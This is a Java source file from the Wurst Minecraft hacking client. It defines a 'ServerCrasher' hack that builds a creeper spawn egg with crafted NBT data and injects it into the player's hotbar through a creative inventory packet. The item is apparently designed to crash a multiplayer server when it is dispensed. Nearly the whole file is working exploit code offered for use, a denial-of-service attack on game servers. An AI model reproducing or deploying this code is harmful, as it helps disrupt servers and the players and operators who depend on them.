/*
 * Copyright (c) 2014-2022 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import com.mojang.brigadier.exceptions.CommandSyntaxException;

import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.registry.Registry;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.core.MCNbtUtils;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;

@SearchTags({"server crasher", "ServerCrepperSpawnEgg",
	"server creeper spawn egg"})
public final class ServerCrasherHack extends Hack
{
	public ServerCrasherHack()
	{
		super("ServerCrasher");
		
		setCategory(Category.ITEMS);
	}
	
	@Override
	public void onEnable()
	{
		if(!MC.player.getAbilities().creativeMode)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		
		Item item = Registry.ITEM.get(new Identifier("creeper_spawn_egg"));
		ItemStack stack = new ItemStack(item, 1);
		MCNbtUtils.setNbt(stack,createNBT());
		placeStackInHotbar(stack);
		setEnabled(false);
	}
	
	private NbtCompound createNBT()
	{
		try
		{
			return StringNbtReader.parse(
				"{display:{Lore:['\"§r1. Place item in dispenser.\"','\"§r2. Dispense item.\"','\"§r3. Ssss... BOOM!\"'],Name:'{\"text\":\"§rServer Creeper\"}'},EntityTag:{CustomName:\"TEST\",id:\"Creeper\",CustomNameVisible:1}}");
			
		}catch(CommandSyntaxException e)
		{
			throw new RuntimeException(e);
		}
	}
	
	private void placeStackInHotbar(ItemStack stack)
	{
		for(int i = 0; i < 9; i++)
		{
			if(!MC.player.getInventory().getStack(i).isEmpty())
				continue;
			
			MC.player.networkHandler.sendPacket(
				new CreativeInventoryActionC2SPacket(36 + i, stack));
			ChatUtils.message("Item created.");
			return;
		}
		
		ChatUtils.error("Please clear a slot in your hotbar.");
	}
}
